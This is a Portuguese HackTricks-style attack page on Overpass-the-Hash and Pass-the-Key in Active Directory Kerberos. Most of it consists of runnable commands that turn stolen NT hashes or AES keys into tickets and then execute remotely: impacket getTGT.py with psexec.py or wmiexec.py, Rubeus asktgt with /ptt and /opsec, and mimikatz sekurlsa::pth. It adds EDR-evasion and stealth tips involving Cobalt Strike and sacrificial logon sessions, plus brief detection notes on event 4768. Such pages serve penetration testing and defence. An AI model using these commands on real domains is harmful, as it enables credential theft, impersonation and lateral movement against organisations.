# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

O ataque **Overpass The Hash/Pass The Key (PTK)** foi projetado para ambientes nos quais o protocolo NTLM tradicional é restrito e a autenticação Kerberos tem prioridade. Esse ataque utiliza o hash NTLM ou as chaves AES de um usuário para solicitar tickets Kerberos, permitindo acesso não autorizado a recursos dentro de uma rede.

Falando estritamente:

- **Over-Pass-the-Hash** geralmente significa transformar o **hash NT** em um TGT Kerberos por meio da chave Kerberos **RC4-HMAC**.
- **Pass-the-Key** é a versão mais genérica, na qual você já possui uma chave Kerberos, como **AES128/AES256**, e solicita um TGT diretamente com ela.

Essa diferença é importante em ambientes hardened: se o **RC4 estiver desabilitado** ou não for mais assumido pelo KDC, apenas o **hash NT não será suficiente**, e você precisará de uma **chave AES** (ou da senha em texto claro para derivá-la).

Para executar esse ataque, a etapa inicial envolve obter o hash NTLM ou a senha da conta do usuário-alvo. Depois de obter essas informações, é possível conseguir um Ticket Granting Ticket (TGT) para a conta, permitindo que o atacante acesse serviços ou máquinas aos quais o usuário tenha permissões.

O processo pode ser iniciado com os seguintes comandos:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Para cenários que exigem AES256, a opção `-aesKey [AES key]` pode ser utilizada:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` também permite solicitar um **service ticket diretamente por meio de um AS-REQ** com `-service <SPN>`, o que pode ser útil quando você deseja um ticket para um SPN específico sem um TGS-REQ adicional:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Além disso, o ticket obtido pode ser usado com várias ferramentas, incluindo `smbexec.py` ou `wmiexec.py`, ampliando o escopo do ataque.

Problemas encontrados, como _PyAsn1Error_ ou _KDC cannot find the name_, geralmente são resolvidos atualizando a biblioteca Impacket ou usando o hostname em vez do endereço IP, garantindo a compatibilidade com o KDC do Kerberos.

Uma sequência de comandos alternativa usando Rubeus.exe demonstra outro aspecto dessa técnica:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Este método reproduz a abordagem **Pass the Key**, com foco em assumir o controle e utilizar o ticket diretamente para fins de autenticação. Na prática:

- `Rubeus asktgt` envia o **raw Kerberos AS-REQ/AS-REP** por conta própria e não precisa de direitos de administrador, a menos que você queira direcionar outra sessão de logon com `/luid` ou criar uma separada com `/createnetonly`.
- `mimikatz sekurlsa::pth` injeta material de credenciais em uma sessão de logon e, portanto, **toca no LSASS**, o que geralmente exige administrador local ou `SYSTEM` e gera mais ruído do ponto de vista de um EDR.

Exemplos com Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Para cumprir a segurança operacional e usar AES256, o seguinte comando pode ser aplicado:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` é relevante porque o tráfego gerado pelo Rubeus difere ligeiramente do Kerberos nativo do Windows. Observe também que `/opsec` foi projetado para tráfego **AES256**; usá-lo com RC4 normalmente exige `/force`, o que anula grande parte do objetivo, pois **RC4 em domínios modernos já é um forte indicador**.

## Notas de detecção

Cada solicitação de TGT gera o **evento `4768`** no DC. Nas versões atuais do Windows, esse evento contém mais campos úteis do que os mencionados em writeups antigos:

- `TicketEncryptionType` informa qual enctype foi usado para o TGT emitido. Os valores típicos são `0x17` para **RC4-HMAC**, `0x11` para **AES128** e `0x12` para **AES256**.<sup>[[3]](#references)</sup>
- Os eventos atualizados também expõem `SessionKeyEncryptionType`, `PreAuthEncryptionType` e os enctypes anunciados pelo cliente, o que ajuda a distinguir uma **dependência real de RC4** de defaults legados confusos.
- Ver `0x17` em um ambiente moderno é uma boa indicação de que a conta, o host ou o caminho de fallback do KDC ainda permite RC4 e, portanto, é mais favorável ao Over-Pass-the-Hash baseado em NT-hash.

A Microsoft vem reduzindo progressivamente o comportamento padrão de RC4 desde as atualizações de hardening do Kerberos de novembro de 2022, e a orientação publicada atualmente é **remover RC4 como o enctype assumido por padrão para AD DCs até o final do segundo trimestre de 2026**. Do ponto de vista ofensivo, isso significa que **Pass-the-Key com AES** é cada vez mais o caminho confiável, enquanto o OpTH clássico **baseado apenas em NT-hash** continuará falhando com mais frequência em ambientes hardened.<sup>[[3]](#references)</sup>

Para mais detalhes sobre os tipos de criptografia do Kerberos e o comportamento relacionado ao uso de tickets, consulte:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Versão mais furtiva

> [!WARNING]
> Cada sessão de logon pode ter apenas um TGT ativo por vez, portanto, tenha cuidado.

1. Crie uma nova sessão de logon com **`make_token`** do Cobalt Strike.
2. Em seguida, use o Rubeus para gerar um TGT para a nova sessão de logon sem afetar a existente.

É possível obter um isolamento semelhante diretamente com o Rubeus usando uma sessão **de tipo de logon 9** sacrificial:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Isso evita sobrescrever o TGT da sessão atual e geralmente é mais seguro do que importar o ticket para sua sessão de logon existente.

## Referências

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detect and Remediate RC4 Usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
